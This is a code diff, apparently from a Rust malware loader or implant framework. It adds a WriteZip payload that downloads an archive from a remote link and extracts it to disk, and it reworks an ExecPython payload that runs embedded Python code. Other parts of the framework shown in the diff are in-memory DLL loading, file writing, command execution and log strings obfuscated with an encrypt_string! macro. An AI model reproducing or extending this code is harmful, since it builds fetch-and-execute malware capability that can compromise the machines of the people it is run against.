@@ -48,6 +48,7 @@ pub enum Payload {
     //DownloadAndExec(DownloadAndExec),
     ExecPython(ExecPython),
     Banner(),
+    WriteZip(WriteZip),
     WriteFile(WriteFile),
     Exec(Exec),
 }
@@ -59,6 +60,7 @@ impl Payload {
             //Payload::DownloadAndExec(payload) => payload.download_and_exec(),
             Payload::ExecPython(payload) => payload.deploy_embedder(),
             Payload::Banner() => banner(),
+            Payload::WriteZip(payload) => payload.write_zip(),
             Payload::WriteFile(payload) => payload.write_file(),
             Payload::Exec(payload) => payload.exec_file(),
         };
@@ -165,9 +167,7 @@ impl DllFromMemory {
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct ExecPython {
-    pub link: Link,
-    pub out_filepath: String,
-    pub out_overwrite: bool,
+    pub path: String, //path of python directory
     pub python_code: String,
     pub thread: bool,
 }
@@ -183,29 +183,34 @@ impl ExecPython {
 
     #[cfg(target_os = "windows")]
     pub fn deploy_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
-        let _ = self.download_and_unzip_python();
+        //let _ = self.download_and_unzip_python();
+        let path: PathBuf = calculate_path(&self.path)?;
+        //let st  = p.display().to_string();
+        //let path  = st.as_str();
+        //let path: &str = &p.to_str().unwrap();
+
         info!(
             "{}{}\n",
             encrypt_string!("execute python with Embedder: "),
             &self.python_code
         );
         if self.thread {
-            let thread_out_filepath = self.out_filepath.clone();
+            let thread_python_path = path.clone();
             let thread_python_code = self.python_code.clone();
             let tj: thread::JoinHandle<()> = thread::spawn(move || {
-                embedder::embedder(&thread_out_filepath, &thread_python_code);
+                embedder::embedder(&thread_python_path, &thread_python_code);
             });
             return Ok(PayloadExec::Thread(tj, Payload::ExecPython(self.clone())));
         } else {
-            embedder::embedder(&self.out_filepath, &self.python_code);
+            embedder::embedder(&path, &self.python_code);
             return Ok(PayloadExec::NoThread());
         }
     }
-
+    /*
     pub fn download_and_unzip_python(&self) -> Result<(), anyhow::Error> {
         info!("{}", encrypt_string!("download_and_unzip_python"));
         let archive: Vec<u8> = self.link.fetch_data()?;
-        let target_dir = PathBuf::from(&self.out_filepath); // Doesn't need to exist
+        let target_dir = PathBuf::from(&self.python_path); // Doesn't need to exist
 
         match zip_extract::extract(Cursor::new(archive), &target_dir, true) {
             Ok(_) => {}
@@ -219,6 +224,7 @@ impl ExecPython {
         }
         Ok(())
     }
+     */
 }
 
 pub fn banner() -> Result<PayloadExec, anyhow::Error> {
@@ -257,16 +263,58 @@ pub fn banner() -> Result<PayloadExec, anyhow::Error> {
     Ok(PayloadExec::NoThread())
 }
 
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct WriteZip {
+    pub link: Link,
+    pub path: String,
+}
+
+/*        info!("{}", encrypt_string!("download_and_unzip_python"));
+       let archive: Vec<u8> = self.link.fetch_data()?;
+       let target_dir = PathBuf::from(&self.out_filepath); // Doesn't need to exist
+
+       match zip_extract::extract(Cursor::new(archive), &target_dir, true) {
+           Ok(_) => {}
+           Err(error) => {
+               error!(
+                   "{}{}",
+                   encrypt_string!("error to unzip python lib: "),
+                   error
+               )
+           }
+       }
+*/
+
+impl WriteZip {
+    pub fn write_zip(&self) -> Result<PayloadExec, anyhow::Error> {
+        //TODO verify if file already exist and calculate hash before replacing it.
+        let path: PathBuf = calculate_path(&self.path)?;
+        let _ = create_diretory(&path)?;
+
+        let archive: Vec<u8> = self.link.fetch_data()?;
+
+        info!("[+] Write zip: {:?}", path);
+        match zip_extract::extract(Cursor::new(archive), &path, true) {
+            Ok(_) => {}
+            Err(error) => {
+                error!(
+                    "{}{}",
+                    encrypt_string!("error to unzip python lib: "),
+                    error
+                )
+            }
+        }
+
+        Ok(PayloadExec::NoThread())
+    }
+}
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct WriteFile {
     pub link: Link,
     pub path: String,
     pub hash: String, // optionnal hash to verify if an existing file should be replaced or not.
-                      //pub out_overwrite: bool,
-                      //random name... mais il faut trouver un moyen pour passer la value aux payloads suivantes.
 }
-
 
 impl WriteFile {
     pub fn write_file(&self) -> Result<PayloadExec, anyhow::Error> {
@@ -288,7 +336,6 @@ impl WriteFile {
     }
 }
 
-
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct Exec {
     pub path: String,
@@ -303,7 +350,7 @@ impl Exec {
         let mut comm = Command::new(&path);
 
         #[cfg(target_os = "linux")]
-        set_permission(&path);      
+        set_permission(&path);
 
         for i in self.cmdline.trim().split_whitespace() {
             comm.arg(i);
